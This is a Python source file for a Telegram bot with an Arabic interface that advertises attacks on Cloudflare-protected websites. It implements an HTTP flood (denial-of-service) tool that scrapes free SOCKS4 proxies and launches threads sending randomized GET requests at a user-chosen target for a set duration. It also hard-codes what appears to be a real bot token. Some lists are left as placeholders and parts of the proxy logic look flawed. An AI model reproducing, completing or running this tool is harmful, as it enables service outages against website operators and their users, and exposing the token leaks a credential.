import time
import sys
import os
import string
import random
import socket
import requests
import threading
from urllib.parse import urlparse
import telebot
from telebot import types

SOCKS4 = []
active = 0
flag = threading.Event()

# set colors
b = '\033[1m'  #bright
r = '\033[31m' #red
w = '\033[37m' #white
g = '\033[32m' #green
y = '\033[33m' #yellow

# user-agents, referers, and other headers remain the same as in your original code
UA = [...]
RF = [...]
RH = [...]

# Initialize Telegram bot
TOKEN = '7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU'
bot = telebot.TeleBot(TOKEN)

# Store user sessions
user_sessions = {}

class UserSession:
    def __init__(self):
        self.target = None
        self.port = 80
        self.path = '/'
        self.append = 'y'
        self.proxy_count = 5
        self.thread_count = 5
        self.attack_time = 60
        self.domain = None
        self.ip = None
        self.attack_active = False

def attack(domain, ip, port, append, path, proxy_count, chat_id):
    global UA, RF, RH, SOCKS4, flag
    
    default = f'GET / HTTP/1.1\r\nHost:{domain}\r\nConnection: keep-alive\r\n\r\n'
    
    while not flag.is_set():
        try:
            new_proxy = random.choice(SOCKS4)
            proxy_ip, proxy_port = new_proxy.split(":")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((proxy_ip, proxy_port))
            s.send(default.encode())
            
            count = 0
            while count <= int(proxy_count):
                count +=1
                
                if append.lower().startswith('y'):
                    target_path = path + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
                
                usr = random.choice(UA).format(str(random.randint(50, 150)))
                ref = random.choice(RF).format(domain)
                alt = random.choice(RH)
                header = f'GET {target_path} HTTP/1.1\r\nHost:{domain}\r\nUser-agent:{usr}\r\nReferer:{ref}\r\n{alt}\r\n\r\n'
                s.send(header.encode())
                
                if flag.is_set():
                    break
                    
            s.close() 
            
        except:
            pass

def resolve(target):
    target = target.lower()
    
    if not (target.startswith('http://') or target.startswith('https://')):
        target = 'http://' + target
        
    try:
        domain = urlparse(target).netloc
        ip = socket.gethostbyname(domain)
        return domain, ip
    except:
        return None, None

def checkproxy(proxy):
    global SOCKS4, active
    
    active +=1
    proxy = f'socks4://{proxy}'
    proxies = {'http': proxy, 'https': proxy}
    
    try:
        response = requests.head('http://example.com', proxies=proxies, timeout=3)
        if response.status_code == 200:
            SOCKS4.append(proxy)
    except:
        pass
    
    active -=1

def scrape_proxies():
    global SOCKS4
    SOCKS4 = []
    
    api = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=protocolipport&format=text&timeout=2500'
    
    try:
        response = requests.get(api)
        if response.status_code == 200:
            html_content = response.content.decode().splitlines()
            for line in html_content:
                line = line.replace("socks4://", "")
                SOCKS4.append(line)
    except:
        pass
    
    if not SOCKS4:
        return False
    
    CHECK_SOCKS4 = SOCKS4.copy()
    SOCKS4.clear()
    
    for proxy in CHECK_SOCKS4:
        x = threading.Thread(target=checkproxy, args=(proxy,))
        x.daemon = True
        x.start()
        while active >= 5:
            pass
    
    return len(SOCKS4) > 0

def start_attack(session, chat_id):
    global flag
    
    if session.attack_active:
        bot.send_message(chat_id, "هجوم قيد التشغيل بالفعل!")
        return
    
    if not SOCKS4:
        bot.send_message(chat_id, "جارٍ جمع البروكسيات...")
        if not scrape_proxies():
            bot.send_message(chat_id, "فشل في جمع البروكسيات!")
            return
    
    session.domain, session.ip = resolve(session.target)
    if not session.domain or not session.ip:
        bot.send_message(chat_id, "فشل في تحليل النطاق!")
        return
    
    session.attack_active = True
    flag.clear()
    
    tasks = []
    for _ in range(0, int(session.thread_count)):
        t = threading.Thread(target=attack, args=(session.domain, session.ip, session.port, 
                                                session.append, session.path, session.proxy_count, chat_id))
        t.daemon = True
        tasks.append(t)
        t.start()
    
    stop_attack = time.time() + session.attack_time
    bot.send_message(chat_id, f"بدأ الهجوم على {session.domain} لمدة {session.attack_time} ثانية...")
    
    while time.time() <= stop_attack and not flag.is_set():
        time.sleep(1)
    
    flag.set()
    session.attack_active = False
    
    for t in tasks:
        try:
            t.join()
        except:
            pass
    
    bot.send_message(chat_id, f"اكتمل الهجوم على {session.domain}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_sessions[chat_id] = UserSession()
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('تعيين الهدف')
    btn2 = types.KeyboardButton('تعيين الإعدادات')
    btn3 = types.KeyboardButton('بدء الهجوم')
    btn4 = types.KeyboardButton('إيقاف الهجوم')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(chat_id, "مرحبًا! هذا بوت للهجوم على المواقع المحمية بـ Cloudflare.\n\n"
                            "استخدم الأزرار أدناه للتحكم:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'تعيين الهدف')
def set_target(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions:
        user_sessions[chat_id] = UserSession()
    
    msg = bot.send_message(chat_id, "أدخل رابط الهدف (مثال: https://example.com):")
    bot.register_next_step_handler(msg, process_target)

def process_target(message):
    chat_id = message.chat.id
    target = message.text.strip()
    
    domain, ip = resolve(target)
    if not domain or not ip:
        bot.send_message(chat_id, "فشل في تحليل النطاق! يرجى المحاولة مرة أخرى.")
        return
    
    user_sessions[chat_id].target = target
    user_sessions[chat_id].domain = domain
    user_sessions[chat_id].ip = ip
    bot.send_message(chat_id, f"تم تعيين الهدف إلى: {target}\nIP: {ip}")

@bot.message_handler(func=lambda message: message.text == 'تعيين الإعدادات')
def set_settings(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions:
        user_sessions[chat_id] = UserSession()
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('تعيين المنفذ')
    btn2 = types.KeyboardButton('تعيين المسار')
    btn3 = types.KeyboardButton('تعيين الطلبات لكل بروكسي')
    btn4 = types.KeyboardButton('تعيين عدد الثريدات')
    btn5 = types.KeyboardButton('تعيين مدة الهجوم')
    btn6 = types.KeyboardButton('إضافة سلسلة عشوائية')
    btn7 = types.KeyboardButton('العودة')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    
    bot.send_message(chat_id, "اختر الإعداد الذي تريد تغييره:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'تعيين المنفذ')
def set_port(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "أدخل رقم المنفذ (افتراضي 80):")
    bot.register_next_step_handler(msg, process_port)

def process_port(message):
    chat_id = message.chat.id
    try:
        port = int(message.text.strip())
        user_sessions[chat_id].port = port
        bot.send_message(chat_id, f"تم تعيين المنفذ إلى: {port}")
    except:
        bot.send_message(chat_id, "قيمة غير صالحة! تم استخدام المنفذ الافتراضي 80.")

# Similar handlers for other settings (path, proxy_count, thread_count, attack_time, append)

@bot.message_handler(func=lambda message: message.text == 'بدء الهجوم')
def start_attack_handler(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions or not user_sessions[chat_id].target:
        bot.send_message(chat_id, "الرجاء تعيين الهدف أولاً!")
        return
    
    session = user_sessions[chat_id]
    if session.attack_active:
        bot.send_message(chat_id, "هجوم قيد التشغيل بالفعل!")
        return
    
    bot.send_message(chat_id, "جارٍ بدء الهجوم...")
    start_attack(session, chat_id)

@bot.message_handler(func=lambda message: message.text == 'إيقاف الهجوم')
def stop_attack_handler(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions:
        return
    
    global flag
    flag.set()
    user_sessions[chat_id].attack_active = False
    bot.send_message(chat_id, "تم إيقاف الهجوم.")

@bot.message_handler(func=lambda message: message.text == 'العودة')
def back_to_main(message):
    chat_id = message.chat.id
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('تعيين الهدف')
    btn2 = types.KeyboardButton('تعيين الإعدادات')
    btn3 = types.KeyboardButton('بدء الهجوم')
    btn4 = types.KeyboardButton('إيقاف الهجوم')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(chat_id, "العودة إلى القائمة الرئيسية:", reply_markup=markup)

if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling()
